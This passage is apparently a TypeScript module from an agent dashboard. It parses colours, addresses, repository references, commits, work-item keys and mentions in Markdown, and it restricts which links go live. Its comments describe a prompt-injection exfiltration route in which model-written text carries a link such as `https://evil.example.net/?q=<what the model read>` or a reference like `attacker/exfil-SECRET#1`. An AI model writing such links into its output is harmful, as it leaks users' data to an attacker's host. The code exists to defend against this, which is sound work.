/**
 * What operator-facing prose names, read out of its words: a colour, an
 * address, a code host's reference or commit, a work item's key, a seat.
 *
 * The Markdown renderer draws each with its mark (a swatch, a vendor's mark,
 * a kind's glyph, a face) so a reader sees what a token IS before reading it.
 * This file decides only WHERE the tokens are and what each one says; what a
 * token becomes (whether its project exists, whether it links and where) is
 * decided where it is drawn, from the company's own records
 * (`components/InlineToken.tsx`).
 *
 * THE RULES, decided once, here:
 *
 *  1. A COLOUR in prose is `#` and three or six hex digits holding at least
 *     one digit AND one letter, at word boundaries: `#ffe100` is a colour,
 *     `#123` an issue and `#facade` a hashtag. A code span that holds one
 *     colour and nothing else (`#fff`, `#debe42`, `rgb(255, 225, 0)`) is a
 *     colour whatever its digits, since that is how a colour is quoted
 *     ([codeColour]); a colour inside a longer span (`color: #fff;`) is code.
 *     An alpha form (`#rrggbbaa`) is never one: a swatch cannot show it.
 *  2. AN ADDRESS is a bare `http://` or `https://` URL in prose, ending at a
 *     space, an angle bracket, a quote or a backtick, with a trailing stop or
 *     an unbalanced closing bracket left to the sentence. What it is (a pull
 *     request, a channel, a page) is read from its PARSED host and path
 *     ([describeLink]), never from any words around it.
 *  3. A REFERENCE is `owner/repo#14` (an issue or a pull request), `group/
 *     project!7` (a merge request) or `owner/repo@b5362d2` (a commit), the
 *     path two segments or more, at boundaries no path or address continues
 *     across, so `https://x.test/a/b#1` and `/a/b#1` are not one.
 *  3a. A REPOSITORY is a bare `owner/repo`, exactly two segments, and only
 *     where `owner` is one the company's code hosts name (`link_hosts`'
 *     `owners`, any case): `gophrase/backend` is one, and `and/or`,
 *     `src/app`, `client/server`, `2024/10` and `1/2` are words because no
 *     company works under `and`, `src` or `2024`. It is at the boundaries a
 *     reference is, never continued by a slash, a `#`, `!` or `@` (that is
 *     a reference), or a dot and a letter (`gophrase/backend.py`). Its name
 *     holds no dot, which in prose is a file's extension or a stop; a
 *     repository named with one is written as a reference or an address.
 *  3b. A BARE NUMBER (`#11`) is a reference only where its repository is
 *     known, in this order, and otherwise words:
 *     0. THE SAME SENTENCE BINDS IT: `#7 in owner/repo` (or `on`, `of`,
 *        `from`) and `owner/repo #7` (or `PR #7`, `pull request #7`,
 *        `issue #7`, `MR #7`, `merge request #7`, the last two a merge
 *        request) are one reference, its words the whole phrase. The
 *        repository needs no configured owner: the phrase says it is one.
 *     1. THE MESSAGE NAMES THE NUMBER IN FULL: `gophrase/backend#11`
 *        elsewhere in the message (an ask's question, context and options,
 *        one comment, one page) makes `#11` that reference; the same number
 *        under two repositories is words.
 *     2. THE MESSAGE NAMES ONE REPOSITORY: every reference, repository and
 *        code host address in it names the same one, and `#11` is in it.
 *     3. Otherwise `#11` is words: a list's number, a rank, a heading.
 *     THE TRADE-OFF, CHOSEN: in a message naming one repository, a rank or
 *     a heading's number (`our #1 priority`, `## #2 heading`) is read as an
 *     issue in it too, as GitHub's own autolinking reads one in that
 *     repository's comments. Telling them apart would take guessing at the
 *     words around a number, which is the guess this rule exists to avoid.
 *     A message is what [messageScope] reads. The number has no leading
 *     zero and nothing of a word, a path, an entity (`&#11;`) or a decimal
 *     (`#1.5`) on either side, and a code span is never read at all.
 *  4. A COMMIT is seven to forty lowercase hex characters holding a digit and
 *     a letter, and only where the prose says it is one: after the word
 *     `commit`, or after `at`, `at head` or `head` following a reference
 *     earlier in the same run ("gophrase/backend#14 at b5362d2"). A hex word
 *     on its own (`deadbeef1`, `at 1234567`) is a word.
 *  5. A KEY is a capital, capitals and digits, a hyphen and a number
 *     (`GP-66`), at the boundaries the assistant's record chips use: no
 *     letter, digit, underscore or hyphen on either side, a slash between
 *     two keys delimiting. A key inside an address or a path is part of it
 *     (`lib/writtenOut.ts`).
 *  6. A MENTION is `@` and a seat's handle (`[a-z0-9][a-z0-9-]*`), with no
 *     letter, digit, dot, `@` or slash before it, so an email address is
 *     never one.
 *  7. Where two tokens overlap, the one that starts first wins, then the
 *     longer: an address swallows every key and colour spelled inside it.
 *
 * Every pattern here runs in time linear in its run: a comment is written by
 * an agent that may have read anything, and every reader renders it.
 */

import { safeHref } from "@crewlethq/ui";
import type { LinkHost, LinkHostKind } from "~/contract/integrations.ts";
import { overlapsAny, writtenOutSpans } from "./writtenOut.ts";
import { linkSegment } from "./segment.ts";

/** One token of a run, as [at, end) and what it is. */
export type InlineToken =
  | { kind: "colour"; at: number; end: number; text: string; hex: string }
  | { kind: "address"; at: number; end: number; text: string; href: string }
  | {
      kind: "reference";
      at: number;
      end: number;
      text: string;
      path: string;
      /** `#` an issue or a pull request, `!` a merge request, `@` a commit. */
      sep: "#" | "!" | "@";
      id: string;
    }
  | {
      kind: "commit";
      at: number;
      end: number;
      text: string;
      sha: string;
      /** The reference this commit follows in the run, where it follows one. */
      after: { path: string; sep: "#" | "!" | "@" } | null;
    }
  | {
      kind: "repository";
      at: number;
      end: number;
      text: string;
      owner: string;
      repo: string;
    }
  | { kind: "key"; at: number; end: number; text: string; project: string }
  | { kind: "mention"; at: number; end: number; text: string; handle: string };

/** Hex digits holding a digit and a letter: a colour in prose, a commit's SHA. */
function mixed(hex: string): boolean {
  return /\d/.test(hex) && /[a-f]/i.test(hex);
}

/** `#rgb` or `#rrggbb` as the six-digit lowercase form a swatch takes. */
function hexOf(digits: string): string {
  const d = digits.toLowerCase();
  return d.length === 3 ? `#${d[0]}${d[0]}${d[1]}${d[1]}${d[2]}${d[2]}` : `#${d}`;
}

const HEX_ONLY = /^#([0-9a-f]{3}|[0-9a-f]{6})$/iu;
const RGB_ONLY = /^rgb\(\s*(\d{1,3})\s*,?\s*(\d{1,3})\s*,?\s*(\d{1,3})\s*\)$/iu;

/**
 * The colour a code span holds when it holds nothing else, as `#rrggbb`, or
 * null (rule 1).
 */
export function codeColour(code: string): string | null {
  const text = code.trim();
  const hex = HEX_ONLY.exec(text);
  if (hex) return hexOf(hex[1]!);
  const rgb = RGB_ONLY.exec(text);
  if (!rgb) return null;
  const channels = [rgb[1], rgb[2], rgb[3]].map(Number);
  if (channels.some((c) => c > 255)) return null;
  return `#${channels.map((c) => c.toString(16).padStart(2, "0")).join("")}`;
}

const COLOUR = /(?<![\p{L}\p{N}_&#/-])#([0-9a-f]{6}|[0-9a-f]{3})(?![\p{L}\p{N}_-])/giu;
const ADDRESS = /\bhttps?:\/\/[^\s<>"'`]+/giu;
const REFERENCE =
  /(?<![\p{L}\p{N}_./@-])((?:[A-Za-z0-9][\w.-]*\/)+[A-Za-z0-9][\w.-]*?)([#!@])([0-9a-f]{7,40}|\d+)(?![\p{L}\p{N}_-])/gu;
const REPOSITORY =
  /(?<![\p{L}\p{N}_./@~:#!-])([A-Za-z0-9][A-Za-z0-9-]*)\/([A-Za-z0-9_-]*[A-Za-z0-9_])(?![\p{L}\p{N}_/@#!-]|\.[\p{L}\p{N}])/gu;
/** What a bound number's repository is spelled as: owner, slash, name, no trailing stop. */
const BOUND_PATH = String.raw`([A-Za-z0-9][A-Za-z0-9-]*\/[A-Za-z0-9_.-]*[A-Za-z0-9_])`;
/** Where a bound repository ends: nothing that continues a path, a reference or a word. */
const PATH_END = String.raw`(?![\p{L}\p{N}_/@#!-]|\.[\p{L}\p{N}])`;
/** A bare number: no leading zero, nothing of a word, a path, an entity or a decimal around it. */
const NUMBER = String.raw`#([1-9]\d{0,8})(?![\p{L}\p{N}_-]|\.\d)`;
const NUMBER_BEFORE = String.raw`(?<![\p{L}\p{N}_&#./-])`;
const BOUND_AFTER = new RegExp(
  `${NUMBER_BEFORE}#([1-9]\\d{0,8})\\s+(?:in|on|of|from)\\s+${BOUND_PATH}${PATH_END}`,
  "giu",
);
const BOUND_BEFORE = new RegExp(
  `(?<![\\p{L}\\p{N}_./@~:#!-])${BOUND_PATH}\\s+(?:(PR|pull request|issue|MR|merge request)\\s+)?${NUMBER}`,
  "giu",
);
const BARE_NUMBER = new RegExp(`${NUMBER_BEFORE}${NUMBER}`, "gu");
const COMMIT_AFTER = /\b(commit|at head|at|head)\s+([0-9a-f]{7,40})(?![\p{L}\p{N}_-])/gu;
const KEY = /(?<![\p{L}\p{N}_-])(\p{Lu}[\p{Lu}\p{N}]*)-\p{N}+(?![\p{L}\p{N}_-])/gu;
const MENTION = /(?<![\p{L}\p{N}_.@/-])@([a-z0-9][a-z0-9-]*)(?![\p{L}\p{N}_-])/gu;

/**
 * An address's own end: a trailing stop or an unbalanced closing bracket is
 * the sentence's.
 *
 * ONE COUNT, THEN ONE WALK BACK: the brackets are counted once and each one
 * trimmed is taken off its count. Counting the whole address again for every
 * character trimmed made `https://x.test/` and 20,000 closing brackets take
 * seconds, on every render of every reader of the comment holding it.
 */
function trimAddress(raw: string): string {
  const count = (c: string) => raw.split(c).length - 1;
  const unmatched = { ")": count(")") - count("("), "]": count("]") - count("[") };
  let end = raw.length;
  while (end > 0) {
    const last = raw[end - 1]!;
    if (".,;:!?".includes(last)) {
      end--;
    } else if ((last === ")" || last === "]") && unmatched[last] > 0) {
      unmatched[last]--;
      end--;
    } else {
      break;
    }
  }
  return raw.slice(0, end);
}

/** No code host owners: a bare `owner/repo` is never a repository (rule 3a). */
export const NO_OWNERS: ReadonlySet<string> = new Set();

/**
 * What a message names (rule 3b): the repositories its references name under
 * each number, and every repository it names at all, each as `owner/repo`.
 */
export interface MessageScope {
  numbers: ReadonlyMap<string, ReadonlySet<string>>;
  repositories: ReadonlySet<string>;
}

/** A message that names nothing: every bare number in it is words. */
export const NO_SCOPE: MessageScope = { numbers: new Map(), repositories: new Set() };

/**
 * Every token in one run of prose, in order, none overlapping (rule 7), with
 * `owners` the code hosts' owners in lower case ([codeHostOwners]) and
 * `scope` what the message the run belongs to names ([messageScope]).
 */
export function inlineTokens(
  text: string,
  owners: ReadonlySet<string> = NO_OWNERS,
  scope: MessageScope = NO_SCOPE,
): InlineToken[] {
  const found: InlineToken[] = [];
  for (const m of text.matchAll(ADDRESS)) {
    const raw = trimAddress(m[0]);
    const href = safeHref(raw);
    if (href === null) continue;
    found.push({ kind: "address", at: m.index, end: m.index + raw.length, text: raw, href });
  }
  for (const m of text.matchAll(REFERENCE)) {
    const [whole, path, sep, id] = m as unknown as [string, string, "#" | "!" | "@", string];
    if (sep === "@" ? !mixed(id) || id !== id.toLowerCase() : !/^\d+$/.test(id)) continue;
    found.push({
      kind: "reference",
      at: m.index,
      end: m.index + whole.length,
      text: whole,
      path,
      sep,
      id,
    });
  }
  if (owners.size > 0) {
    for (const m of text.matchAll(REPOSITORY)) {
      const [whole, owner, repo] = m as unknown as [string, string, string];
      if (!owners.has(owner.toLowerCase())) continue;
      found.push({
        kind: "repository",
        at: m.index,
        end: m.index + whole.length,
        text: whole,
        owner,
        repo,
      });
    }
  }
  for (const m of text.matchAll(COLOUR)) {
    if (!mixed(m[1]!)) continue;
    found.push({
      kind: "colour",
      at: m.index,
      end: m.index + m[0].length,
      text: m[0],
      hex: hexOf(m[1]!),
    });
  }
  const paths = writtenOutSpans(text);
  // RULE 3b.0: a number the sentence binds to a repository, as one reference.
  for (const m of text.matchAll(BOUND_AFTER)) {
    const [whole, id, path] = m as unknown as [string, string, string];
    found.push({
      kind: "reference",
      at: m.index,
      end: m.index + whole.length,
      text: whole,
      path,
      sep: "#",
      id,
    });
  }
  for (const m of text.matchAll(BOUND_BEFORE)) {
    const [whole, path, cue, id] = m as unknown as [string, string, string | undefined, string];
    const merge = cue !== undefined && /^(mr|merge request)$/iu.test(cue);
    found.push({
      kind: "reference",
      at: m.index,
      end: m.index + whole.length,
      text: whole,
      path,
      sep: merge ? "!" : "#",
      id,
    });
  }
  // RULES 3b.1 and 3b.2: a bare number the message places in one repository.
  for (const m of text.matchAll(BARE_NUMBER)) {
    const end = m.index + m[0].length;
    if (overlapsAny(paths, m.index, end)) continue;
    const id = m[1]!;
    const named = scope.numbers.get(id);
    const path =
      named !== undefined
        ? named.size === 1
          ? [...named][0]
          : undefined
        : scope.repositories.size === 1
          ? [...scope.repositories][0]
          : undefined;
    if (path === undefined) continue;
    found.push({ kind: "reference", at: m.index, end, text: m[0], path, sep: "#", id });
  }
  for (const m of text.matchAll(KEY)) {
    const end = m.index + m[0].length;
    if (overlapsAny(paths, m.index, end)) continue;
    found.push({ kind: "key", at: m.index, end, text: m[0], project: m[1]! });
  }
  for (const m of text.matchAll(MENTION)) {
    found.push({
      kind: "mention",
      at: m.index,
      end: m.index + m[0].length,
      text: m[0],
      handle: m[1]!,
    });
  }

  const chosen = settle(found);
  // RULE 4 READS THE SETTLED REFERENCES, so a commit follows a reference the
  // run actually names rather than one an address swallowed.
  //
  // ONE WALK, alongside the commits: both are in order, so the reference
  // before each commit is the last one the walk has passed. Looking every
  // reference up again for each commit made a run of references and commits
  // take more than a second at 420,000 characters.
  const commits: InlineToken[] = [];
  let next = 0;
  let before: InlineToken | undefined;
  for (const m of text.matchAll(COMMIT_AFTER)) {
    const sha = m[2]!;
    if (!mixed(sha)) continue;
    const at = m.index + m[0].length - sha.length;
    for (; next < chosen.length && chosen[next]!.end <= m.index; next++) {
      if (chosen[next]!.kind === "reference") before = chosen[next];
    }
    if (m[1] !== "commit" && before === undefined) continue;
    commits.push({
      kind: "commit",
      at,
      end: at + sha.length,
      text: sha,
      sha,
      after: before?.kind === "reference" ? { path: before.path, sep: before.sep } : null,
    });
  }
  return commits.length === 0 ? chosen : settle([...chosen, ...commits]);
}

/** The earliest token first, then the longer, and nothing that overlaps one chosen. */
function settle(found: InlineToken[]): InlineToken[] {
  const sorted = [...found].sort((a, b) => a.at - b.at || b.end - a.end);
  const out: InlineToken[] = [];
  let until = 0;
  for (const t of sorted) {
    if (t.at < until) continue;
    out.push(t);
    until = t.end;
  }
  return out;
}

// --- where a link may go --------------------------------------------------

/**
 * Where a run's links may go.
 *
 *  - `anchor`: a link is a link, to wherever its safe address goes.
 *  - `checked`: a link is live ONLY WHERE THE DASHBOARD BUILT IT, from parts
 *    it checked, to a place that is the company's: a key to its work item, a
 *    handle to its seat, a reference, a commit or a repository to the code
 *    host the company configured, and an address on a host the company
 *    configured (a code host, Jira, Confluence, Mattermost) REBUILT from
 *    what it is ([LinkDescription.canonical]), with nothing else the written
 *    address carried. Every other address, an app route a writer spelled
 *    among them, is drawn inert: its words, then the host it names, readable
 *    and copyable and never a control.
 *  - `text`: no link at all, inside a control or a link's own label, where a
 *    link is invalid or steals the press.
 *
 * WHY `checked`. Words an agent or a model wrote may carry what it read from
 * anywhere, a prompt injection among it, and an address is the one thing in
 * them a reader acts on with a click: `https://evil.example.net/?q=<what the
 * model read>` hands the words to whoever owns the host. A link the
 * dashboard builds can only reach the company's own places, so a click there
 * carries nothing a writer chose but a validated name or number. The
 * Dashboard Assistant's answers and the Inbox read `checked` (ADR-0061).
 */
export type LinkMode = "anchor" | "checked" | "text";

/**
 * Where a link points, as a reader checks it: the host and the path of a web
 * address with no scheme (`docs.example.com/pricing`), the address of a
 * `mailto:`, and nothing for anything else (an app route, a scheme this
 * product does not follow), which is drawn as its label alone.
 */
export function linkTarget(raw: string): string | null {
  const href = safeHref(raw);
  if (!href || href.startsWith("#")) return null;
  if (href.startsWith("mailto:")) return href.slice("mailto:".length);
  try {
    const url = new URL(href);
    const path = url.pathname === "/" ? "" : url.pathname;
    return `${url.host}${path}`;
  } catch {
    return null;
  }
}

// --- what an address is ----------------------------------------------------

/** The vendors an address can be drawn with the mark of (`@crewlethq/icons`' `Vendor`). */
export type LinkVendor = "github" | "gitlab" | "slack" | "mattermost" | "atlassian";

/** A code host's repository an address names, and the issue or pull request number in it. */
export interface CodePlace {
  /** `owner/repo` (a GitLab project's whole path), lower case. */
  path: string;
  /** An issue's or a pull request's number, or null for a repository, a merge request or a commit. */
  number: string | null;
}

/** What an address is, as a reader is shown it. */
export interface LinkDescription {
  /** Whose mark it is drawn with, or null for an address of nobody we know. */
  vendor: LinkVendor | null;
  /** What it says in place of the whole address: `gophrase/backend#14`, `~design`. */
  label: string;
  /** Whether the label is an identifier set in mono (a reference, a key). */
  code: boolean;
  /**
   * What its mark means, said before its words to a screen reader ("GitHub",
   * "Jira", "Slack"), or null for an address of nobody we know, whose words
   * are its host.
   */
  kind: string | null;
  /**
   * The address rebuilt from what it is (`<host>/<owner>/<repo>/pull/14`),
   * on a host the company configured, with no query, fragment or anything
   * else the written address carried; null for every other address. See
   * [LinkMode] `checked`: this is the only address a written link opens there.
   */
  canonical: string | null;
  /** The code host repository it names, which a message's scope reads ([messageScope]). */
  place: CodePlace | null;
}

/** The longest label an address is shown with before it is cut. */
export const ADDRESS_LABEL_MAX = 48;

/** A host and path as a reader reads them, cut at [ADDRESS_LABEL_MAX]. */
function shortAddress(url: URL): string {
  const path = url.pathname === "/" ? "" : url.pathname;
  const shown = `${url.host}${path}`;
  return shown.length > ADDRESS_LABEL_MAX ? `${shown.slice(0, ADDRESS_LABEL_MAX - 1)}…` : shown;
}

/** The path under `base` when `url` is at it (host and path prefix), else null. */
function under(url: URL, base: string): string[] | null {
  let root: URL;
  try {
    root = new URL(base);
  } catch {
    return null;
  }
  if (url.host.toLowerCase() !== root.host.toLowerCase()) return null;
  const prefix = root.pathname.replace(/\/+$/, "");
  if (prefix !== "" && url.pathname !== prefix && !url.pathname.startsWith(`${prefix}/`))
    return null;
  return segments(url.pathname.slice(prefix.length));
}

/**
 * A path's segments, each decoded where it decodes.
 *
 * NEVER INTO A SLASH: `a%2Fevil` is one segment, and decoded it read as two,
 * so `github.com/a%2Fevil/b/pull/1` was labelled `a/evil/b#1`, a repository
 * the address is not. A segment that decodes to a slash stays as written.
 */
function segments(path: string): string[] {
  return path
    .split("/")
    .filter(Boolean)
    .map((part) => {
      try {
        const decoded = decodeURIComponent(part);
        return decoded.includes("/") ? part : decoded;
      } catch {
        return part;
      }
    });
}

/**
 * A GitHub owner or repository, or a GitLab group or project: letters,
 * digits, `.`, `_` and `-`, starting with a letter or a digit. A label is
 * built from these alone; a segment that is anything else (`a%2Fevil`) makes
 * the address its host and path, which say what it is.
 */
const CODE_NAME = /^[A-Za-z0-9][\w.-]*$/u;

/** A commit's SHA in an address, as its label shortens it. */
const SHA = /^[0-9a-f]{7,40}$/iu;

/** A path segment an address is rebuilt from: letters, digits, `.`, `_`, `~` and `-`. */
const SEGMENT = /^[A-Za-z0-9~_.-]+$/u;

/** Where an address is under an app's hosts: its segments, and the company's host it is under. */
interface Under {
  parts: string[];
  /** The configured host it is under, or null under the app's public host alone. */
  own: LinkHost | null;
}

/**
 * Whether a code host takes `owner`'s repositories as the company's: only an
 * owner it names (`link_hosts`' `owners`), in any case. `attacker/exfil#1` on
 * a GitHub the company works on under `gophrase` is somebody else's
 * repository, and no link is built to it.
 *
 * CLOSED WITHOUT OWNERS: a host that names none (a company that configured
 * no organization, group or repository) vouches for no owner, so every
 * reference to it keeps its mark and links nowhere, rather than every owner
 * a writer spells becoming the company's.
 */
function ownsOwner(host: LinkHost, owner: string): boolean {
  return (host.owners ?? []).includes(owner.toLowerCase());
}

/**
 * Where `url` is under one of an app's hosts: a host the company configured
 * for it first (`link_hosts`, with its path prefix), then its public one.
 */
function underApp(
  url: URL,
  hosts: readonly LinkHost[],
  kind: LinkHostKind,
  publicBase?: string,
): Under | null {
  for (const host of hosts) {
    if (host.kind !== kind) continue;
    const parts = under(url, host.url);
    if (parts !== null) return { parts, own: host };
  }
  const parts = publicBase === undefined ? null : under(url, publicBase);
  return parts === null ? null : { parts, own: null };
}

/**
 * An address on the company's own `base`, rebuilt from `parts`, each checked
 * against [SEGMENT] and encoded, or null where there is no base or a part is
 * not one an address is rebuilt from.
 */
function rebuilt(base: string | null, parts: readonly string[]): string | null {
  if (base === null || !parts.every((p) => SEGMENT.test(p))) return null;
  const path = segmentsOf(parts);
  return path === null ? null : safeHref(`${base}/${path}`);
}

/**
 * `parts` as the path of a link, each one segment ([linkSegment]), or null
 * where one cannot be: a title or a name of dots alone is drawn as words,
 * never as an address that goes to the page above.
 */
function segmentsOf(parts: readonly string[]): string | null {
  const segments = parts.map(linkSegment);
  return segments.every((s) => s !== null) ? segments.join("/") : null;
}

/** A host at a domain or under it, on a dot: `acme.slack.com` is Slack's, `slack.com.evil.test` is not. */
function atDomain(host: string, domain: string): boolean {
  const h = host.toLowerCase();
  return h === domain || h.endsWith(`.${domain}`);
}

/** An address of an app whose words it is no reference of: its host and path, after its mark. */
function hostAndPath(vendor: LinkVendor, kind: string, url: URL): LinkDescription {
  return { vendor, label: shortAddress(url), code: false, kind, canonical: null, place: null };
}

function describeGitHub({ parts, own }: Under, url: URL): LinkDescription {
  const [owner, repo, what, id] = parts;
  if (!owner || !repo || !CODE_NAME.test(owner) || !CODE_NAME.test(repo)) {
    return hostAndPath("github", "GitHub", url);
  }
  const path = `${owner}/${repo}`.toLowerCase();
  const said = (label: string, tail: string[], number: string | null = null) => ({
    vendor: "github" as const,
    label,
    code: true,
    kind: "GitHub",
    canonical:
      own !== null && ownsOwner(own, owner) ? rebuilt(own.url, [owner, repo, ...tail]) : null,
    place: { path, number },
  });
  if ((what === "pull" || what === "issues") && id && /^\d+$/.test(id)) {
    return said(`${owner}/${repo}#${id}`, [what, id], id);
  }
  if (what === "commit" && id && SHA.test(id)) {
    return said(`${owner}/${repo}@${id.slice(0, 7)}`, [what, id]);
  }
  if (what === undefined) return said(`${owner}/${repo}`, []);
  return hostAndPath("github", "GitHub", url);
}

function describeGitLab({ parts, own }: Under, url: URL): LinkDescription {
  const dash = parts.indexOf("-");
  const names = dash < 0 ? parts : parts.slice(0, dash);
  if (names.length < 2 || !names.every((name) => CODE_NAME.test(name))) {
    return hostAndPath("gitlab", "GitLab", url);
  }
  const project = names.join("/");
  const path = project.toLowerCase();
  const [what, id] = dash < 0 ? [] : parts.slice(dash + 1);
  const said = (label: string, tail: string[], number: string | null = null) => ({
    vendor: "gitlab" as const,
    label,
    code: true,
    kind: "GitLab",
    canonical:
      own !== null && ownsOwner(own, names[0]!) ? rebuilt(own.url, [...names, ...tail]) : null,
    place: { path, number },
  });
  if (what === "merge_requests" && id && /^\d+$/.test(id)) {
    return said(`${project}!${id}`, ["-", what, id]);
  }
  if (what === "issues" && id && /^\d+$/.test(id)) {
    return said(`${project}#${id}`, ["-", what, id], id);
  }
  if (what === "commit" && id && SHA.test(id)) {
    return said(`${project}@${id.slice(0, 7)}`, ["-", what, id]);
  }
  if (dash < 0) return said(project, []);
  return hostAndPath("gitlab", "GitLab", url);
}

/**
 * A Slack address: what it is in the workspace it names. NEVER REBUILT: a
 * workspace is a subdomain anybody can register, so no Slack address is the
 * company's own by its host.
 */
function describeSlack(url: URL): LinkDescription {
  const team = url.hostname.split(".")[0] ?? "";
  const parts = segments(url.pathname);
  if (parts[0] === "archives" && parts[1] && team !== "app") {
    const what = parts[2]?.startsWith("p") ? "Message" : "Channel";
    const label = `${what} in ${team}`;
    return { vendor: "slack", label, code: false, kind: "Slack", canonical: null, place: null };
  }
  return hostAndPath("slack", "Slack", url);
}

/** A Mattermost team's, channel's or post's name: letters, digits, `_` and `-`. */
const MATTERMOST_NAME = /^[A-Za-z0-9_-]+$/u;

/**
 * A Mattermost address: a channel by its name, a post by its team.
 *
 * ITS LABEL IS ONLY WHAT IT IS REBUILT FROM: a team and a channel are names
 * Mattermost itself allows, and a segment that is anything else (spaces, a
 * sentence a writer decoded into the path) labels nothing, so the address
 * shows as its host and path.
 */
function describeMattermost({ parts, own }: Under, url: URL): LinkDescription {
  const [team, what, name] = parts;
  const named =
    team !== undefined &&
    name !== undefined &&
    MATTERMOST_NAME.test(team) &&
    MATTERMOST_NAME.test(name);
  if (named && (what === "channels" || what === "pl")) {
    return {
      vendor: "mattermost",
      label: what === "channels" ? `~${name}` : `Post in ${team}`,
      code: false,
      kind: "Mattermost",
      canonical: rebuilt(own?.url ?? null, [team, what, name]),
      place: null,
    };
  }
  return hostAndPath("mattermost", "Mattermost", url);
}

/**
 * A label on a site anybody can open, with the site said after it.
 *
 * A TENANT IS NOBODY'S IN PARTICULAR: anyone can register `*.atlassian.net`,
 * so an issue key or a page title alone ("Sign in to GitHub") after the
 * Atlassian mark said whatever its author chose, about a site the company
 * never configured. Its host after the label says whose it is. A site the
 * company configured (`link_hosts`) is its own, and its labels stand alone.
 */
function onTenant(label: string, tenant: string | null): string {
  return tenant === null ? label : `${label} (${tenant})`;
}

function describeJira({ parts, own }: Under, url: URL): LinkDescription | null {
  const at = parts.indexOf("browse");
  const key = at < 0 ? undefined : parts[at + 1];
  if (!key || !/^[A-Z][A-Z0-9]*-\d+$/.test(key)) return null;
  return {
    vendor: "atlassian",
    label: onTenant(key, own === null ? url.host : null),
    code: own !== null,
    kind: "Jira",
    canonical: rebuilt(own?.url ?? null, ["browse", key]),
    place: null,
  };
}

/**
 * A Confluence page's parts, as its address is rebuilt from them:
 * `spaces/<KEY>/pages/<id>`, after Cloud's `wiki` where the site's base stops
 * above it (`lead`), or null for any other shape.
 *
 * NOTHING ELSE OF THE WRITTEN PATH: the title after the id is the writer's
 * words, and so is any segment before `spaces`, which a page never needs and
 * which could carry anything a writer chose to the company's own host.
 */
function confluencePage(
  parts: readonly string[],
): { lead: string[]; key: string; id: string } | null {
  const from = parts[0] === "wiki" ? 1 : 0;
  const [spaces, key, pages, id] = parts.slice(from);
  if (spaces !== "spaces" || pages !== "pages" || !key || !id) return null;
  if (!/^~?[A-Za-z0-9]+$/u.test(key) || !/^\d+$/u.test(id)) return null;
  return { lead: parts.slice(0, from), key, id };
}

/**
 * A Confluence address: a page by its space and id.
 *
 * NEVER BY ITS TITLE: the title in a page's address is the writer's words,
 * which the rebuilt address drops, and a label saying "Sign in to GitHub"
 * beside the Atlassian mark would say whatever its writer chose. The label
 * is what the address is rebuilt from, `DES page 123`.
 */
function describeConfluence({ parts, own }: Under, url: URL): LinkDescription | null {
  const page = confluencePage(parts);
  if (page !== null) {
    return {
      vendor: "atlassian",
      label: onTenant(`${page.key} page ${page.id}`, own === null ? url.host : null),
      code: false,
      kind: "Confluence",
      canonical: rebuilt(own?.url ?? null, [...page.lead, "spaces", page.key, "pages", page.id]),
      place: null,
    };
  }
  if (parts.includes("wiki") || parts.includes("spaces") || parts.includes("display")) {
    return hostAndPath("atlassian", "Confluence", url);
  }
  return null;
}

/**
 * What an address is: whose mark it carries, what it says and what it is
 * called, read from the PARSED address alone (rule 2), and the address it is
 * rebuilt as on the company's own host ([LinkDescription.canonical]).
 *
 * THE HOST DECIDES, never a label: a link reading "github.com/x" that goes
 * elsewhere is drawn as where it goes. A host is an app's when it is one the
 * company configured for it (`link_hosts`, with its path prefix), the app's
 * public host exactly (github.com, gitlab.com), or a host under the app's own
 * domain on a dot boundary (`*.slack.com`, `*.atlassian.net`). Null for an
 * address that is not a safe web address at all.
 */
export function describeLink(raw: string, hosts: readonly LinkHost[]): LinkDescription | null {
  const href = safeHref(raw);
  if (href === null || href.startsWith("#") || href.startsWith("mailto:")) return null;
  let url: URL;
  try {
    url = new URL(href);
  } catch {
    return null;
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") return null;

  const gh = underApp(url, hosts, "github", "https://github.com");
  if (gh !== null) return describeGitHub(gh, url);
  const gl = underApp(url, hosts, "gitlab", "https://gitlab.com");
  if (gl !== null) return describeGitLab(gl, url);
  if (atDomain(url.hostname, "slack.com")) return describeSlack(url);
  const mm = underApp(url, hosts, "mattermost");
  if (mm !== null) return describeMattermost(mm, url);

  const cloud = atDomain(url.hostname, "atlassian.net");
  const tenant = (): Under | null => (cloud ? { parts: segments(url.pathname), own: null } : null);
  const jira = underApp(url, hosts, "jira") ?? tenant();
  const wiki = underApp(url, hosts, "confluence") ?? tenant();
  const atlassian = (jira && describeJira(jira, url)) ?? (wiki && describeConfluence(wiki, url));
  if (atlassian) return atlassian;
  if (jira !== null || wiki !== null) return hostAndPath("atlassian", "Atlassian", url);
  return {
    vendor: null,
    label: shortAddress(url),
    code: false,
    kind: null,
    canonical: null,
    place: null,
  };
}

/** Where a bare reference lives, and the address it opens, decided from the hosts alone. */
export interface ReferenceTarget {
  vendor: "github" | "gitlab";
  /** Null where no host is configured for it: the mark is drawn, unlinked. */
  href: string | null;
}

/**
 * Where a bare reference (or a commit after one) points.
 *
 * FROM THE CODE HOSTS ALONE, since no repository list reaches a reader. One
 * code host configured: that host. None: the vendor the spelling names (`!`
 * is GitLab's merge request, `#` reads as GitHub's), drawn with no link, and
 * a commit names no vendor at all. Both GitHub and GitLab configured: a `#`
 * or `@` is the host's whose `owners` hold the path's first segment, and one
 * neither or both hold could be either, so it is no reference (null) and
 * stays text; `!` is still GitLab's.
 *
 * ONLY TO AN OWNER THE HOST NAMES (`owners`, and none where it names none): a
 * reference to anybody else's repository keeps its mark and links nowhere,
 * since its owner and name are the writer's words, and an agent could spell
 * what it read into them (`attacker/exfil-SECRET#1`). On GitHub a repository
 * is exactly `owner/repo`, so a longer path is words.
 */
export function referenceTarget(
  path: string,
  sep: "#" | "!" | "@",
  id: string,
  hosts: readonly LinkHost[],
): ReferenceTarget | null {
  const github = hosts.find((h) => h.kind === "github")?.url ?? null;
  const gitlab = hosts.find((h) => h.kind === "gitlab")?.url ?? null;
  const claimed = ownerHost(path.split("/")[0] ?? "", hosts);
  let vendor: "github" | "gitlab";
  if (sep === "!") vendor = "gitlab";
  else if (github !== null && gitlab !== null) {
    // BOTH HOSTS: the one whose owners hold the path's owner, or words.
    if (claimed === null) return null;
    vendor = claimed.kind as "github" | "gitlab";
  } else if (github !== null) vendor = "github";
  else if (gitlab !== null) vendor = "gitlab";
  else if (sep === "#") vendor = "github";
  else return null;
  const segments = path.split("/");
  // A GITHUB REPOSITORY IS EXACTLY `owner/repo`: `a/b/c/d#2` names nothing
  // there, and is words.
  if (vendor === "github" && segments.length !== 2) return null;
